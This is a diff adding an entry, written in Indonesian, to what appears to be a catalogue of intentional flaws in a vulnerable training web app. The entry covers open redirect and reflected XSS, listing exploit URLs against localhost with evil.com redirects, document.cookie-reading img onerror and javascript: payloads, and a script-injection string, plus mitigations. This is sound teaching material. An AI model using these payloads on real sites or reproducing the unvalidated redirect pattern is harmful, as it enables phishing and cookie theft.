@@ -220,6 +220,29 @@ TOOLS YANG DIREKOMENDASIKAN:
      dampak:         Takeover akun siapapun yang diketahui usernamenya
      mitigasi:       Kirim OTP ke email, gunakan temporary token
 
+[31] Open Redirect + Reflected XSS
+     apa yang salah: Parameter redirect di-redirect tanpa validasi,
+                     URL di-render tanpa sanitasi (dangerouslySetInnerHTML)
+     endpoint:       GET /login?redirect=<url>
+                     GET /api/redirect?url=<url>
+     exploit-1:      Open Redirect (login):
+                     http://localhost/login?redirect=https://evil.com
+                     → Setelah login, user diarahkan ke evil.com
+     exploit-2:      XSS via redirect param (login page):
+                     http://localhost/login?redirect=<img src=x onerror=alert(document.cookie)>
+                     → JavaScript dieksekusi di halaman login
+     exploit-3:      XSS via javascript: URI (setelah login):
+                     http://localhost/login?redirect=javascript:alert(document.cookie)
+                     → Setelah login, javascript: dieksekusi
+     exploit-4:      Backend open redirect:
+                     curl -v "http://localhost:3001/api/redirect?url=https://evil.com"
+                     → 302 redirect ke URL apapun
+     exploit-5:      Backend reflected XSS (di browser):
+                     http://localhost:3001/api/redirect?url="><script>alert(1)</script>
+                     → Script dieksekusi di HTML response
+     dampak:         Phishing, credential theft, cookie stealing
+     mitigasi:       Whitelist URL / relative paths only, sanitize output
+
 ════════════════════════════════════════════════════════════════
   A05 — SECURITY MISCONFIGURATION
 ════════════════════════════════════════════════════════════════
